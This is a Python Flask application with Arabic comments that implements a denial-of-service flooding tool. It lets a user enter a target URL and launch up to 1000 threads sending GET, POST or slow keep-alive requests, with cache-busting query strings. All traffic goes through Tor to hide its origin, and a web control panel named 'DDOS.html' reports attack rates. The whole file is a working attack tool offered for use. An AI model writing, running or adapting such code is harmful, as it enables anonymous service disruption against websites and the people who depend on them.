from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import socket
import requests
import json
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

app = Flask(__name__)
CORS(app)

# ========== إعدادات Tor الإجبارية ==========
TOR_PROXY = {
    'http': 'socks5://127.0.0.1:9050',
    'https': 'socks5://127.0.0.1:9050'
}

# ========== فحص Tor (Orbot) ==========
def check_tor():
    """تفحص إذا كان Tor (Orbot) شغال على المنفذ 9050"""
    try:
        test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_socket.settimeout(3)
        test_socket.connect(('127.0.0.1', 9050))
        test_socket.close()
        return True
    except:
        return False

# ========== حالة الهجوم ==========
attack_state = {
    'running': False,
    'target': '',
    'threads': 0,
    'mode': 'get',
    'total': 0,
    'success': 0,
    'fail': 0,
    'start_time': 0,
    'stop_flag': False
}

# ========== إرسال الطلب عبر Tor ==========
def send_request(target_url, mode='get'):
    try:
        if not check_tor():
            raise Exception("Tor غير متصل")
        
        session = requests.Session()
        session.proxies.update(TOR_PROXY)
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive'
        })
        
        url = target_url
        if '?' not in url:
            url += f"?_={int(time.time()*1000)}&r={random.randint(1,999999)}"
        else:
            url += f"&_={int(time.time()*1000)}&r={random.randint(1,999999)}"
        
        if mode == 'post':
            response = session.post(url, json={'x': random.random()}, timeout=10)
        elif mode == 'slow':
            session.headers['Connection'] = 'keep-alive'
            session.headers['Keep-Alive'] = 'timeout=9999, max=1000'
            response = session.get(url, timeout=10)
        else:
            response = session.get(url, timeout=10)
        
        return response.status_code in [200, 403, 404, 500, 502, 503]
    except Exception as e:
        if 'Tor غير متصل' in str(e):
            raise
        return False

def worker():
    while attack_state['running'] and not attack_state['stop_flag']:
        try:
            result = send_request(attack_state['target'], attack_state['mode'])
            attack_state['total'] += 1
            if result:
                attack_state['success'] += 1
            else:
                attack_state['fail'] += 1
        except Exception as e:
            if 'Tor غير متصل' in str(e):
                attack_state['running'] = False
                attack_state['stop_flag'] = True
                raise
            attack_state['total'] += 1
            attack_state['fail'] += 1

def attack_loop():
    with ThreadPoolExecutor(max_workers=attack_state['threads']) as executor:
        futures = []
        for _ in range(attack_state['threads']):
            futures.append(executor.submit(worker))
        while attack_state['running'] and not attack_state['stop_flag']:
            time.sleep(0.1)
        attack_state['running'] = False

# ========== Routes ==========
@app.route('/')
def index():
    with open('DDOS.html', 'r', encoding='utf-8') as f:
        html_content = f.read()
    return render_template_string(html_content)

@app.route('/check-tor', methods=['GET'])
def check_tor_status():
    connected = check_tor()
    return jsonify({
        'connected': connected,
        'message': '✅ Tor متصل' if connected else '❌ Tor غير متصل! يرجى تشغيل Orbot'
    })

@app.route('/start', methods=['POST'])
def start_attack():
    if attack_state['running']:
        return jsonify({'status': 'error', 'message': 'هجوم قيد التشغيل بالفعل'})
    
    if not check_tor():
        return jsonify({
            'status': 'error',
            'message': '⚠️ Tor غير متصل! يرجى تشغيل تطبيق Orbot أولاً على المنفذ 9050'
        })
    
    data = request.json
    target = data.get('target', '').strip()
    threads = int(data.get('threads', 100))
    mode = data.get('mode', 'get')
    
    if not target:
        return jsonify({'status': 'error', 'message': 'الهدف مطلوب'})
    
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    attack_state['running'] = True
    attack_state['stop_flag'] = False
    attack_state['target'] = target
    attack_state['threads'] = max(1, min(threads, 1000))
    attack_state['mode'] = mode
    attack_state['total'] = 0
    attack_state['success'] = 0
    attack_state['fail'] = 0
    attack_state['start_time'] = time.time()
    
    threading.Thread(target=attack_loop, daemon=True).start()
    
    return jsonify({'status': 'success', 'message': 'بدأ الهجوم عبر Tor'})

@app.route('/stop', methods=['POST'])
def stop_attack():
    attack_state['stop_flag'] = True
    attack_state['running'] = False
    return jsonify({'status': 'success', 'message': 'تم إيقاف الهجوم'})

@app.route('/status', methods=['GET'])
def get_status():
    elapsed = int(time.time() - attack_state['start_time']) if attack_state['start_time'] else 0
    rate = attack_state['total'] / elapsed if elapsed > 0 else 0
    
    return jsonify({
        'running': attack_state['running'],
        'target': attack_state['target'],
        'threads': attack_state['threads'],
        'mode': attack_state['mode'],
        'total': attack_state['total'],
        'success': attack_state['success'],
        'fail': attack_state['fail'],
        'elapsed': elapsed,
        'rate': round(rate, 1),
        'tor_connected': check_tor()
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)